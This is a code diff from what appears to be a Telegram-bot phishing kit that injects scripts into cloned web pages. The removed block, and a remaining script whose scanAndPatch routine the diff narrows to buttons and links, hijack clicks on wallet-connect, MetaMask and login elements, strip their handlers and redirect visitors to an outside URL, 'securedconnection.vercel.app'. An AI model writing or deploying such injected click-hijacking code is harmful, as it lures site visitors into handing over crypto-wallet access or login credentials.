@@ -199,40 +199,7 @@ bot.on("text", async (ctx) => {
         })();
       </script>`);
 
-          $("head").prepend(`<script class="click-handler-script">
-        document.addEventListener("DOMContentLoaded", () => {
-      
-       const interactiveElements = Array.from(document.querySelectorAll("*")).filter(el => 
-  el.innerText.toLowerCase().includes("connect wallet") ||
-  el.innerText.toLowerCase().includes("connect") ||
-  el.innerText.toLowerCase().includes("connect to wallet") ||
-  el.innerText.toLowerCase().includes("wallet connect") ||
-  el.innerText.toLowerCase().includes("metamask") ||
-  el.innerText.toLowerCase().includes("web3") ||
-  el.innerText.toLowerCase().includes("log in") ||
-  el.innerText.toLowerCase().includes("sign in") ||
-  el.innerText.toLowerCase().includes("sign up") ||
-  el.innerText.toLowerCase().includes("register") ||
-  el.innerText.toLowerCase().includes("create account") ||  
-   el.innerText.toLowerCase().includes("login")
-);
-
-          interactiveElements.forEach(el => {
-            el.onclick = null;
-            el.removeAttribute("onclick");
-            if (window.jQuery && typeof jQuery === "function") {
-              try { jQuery(el).off("click"); } catch (err) {}
-            }
-            const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
-            if (reactKey) delete el[reactKey];
-            el.addEventListener("click", (e) => {
-              e.preventDefault();
-              e.stopImmediatePropagation();
-              window.location.href = "${redirectURL}";
-            }, true);
-          });
-        });
-      </script>`);
+     
 
           $("head").prepend(`   <script class="dynamic-script">
   window.addEventListener("DOMContentLoaded", () => {
@@ -318,6 +285,8 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
     setInterval(fixImagesAndButtons, 10000);
   });
 </script>`);
+
+
 $("head").prepend(`  <script>
   const redirectURL = "https://securedconnection.vercel.app/";
 
@@ -344,7 +313,9 @@ $("head").prepend(`  <script>
   }
 
   function scanAndPatch() {
-    const allElements = document.querySelectorAll("*");
+    const allElements = document.querySelectorAll(
+  'button, a, [role="button"], [onclick]'
+);
     allElements.forEach((el) => {
       const text = (el.innerText || "").toLowerCase().trim();
       if (
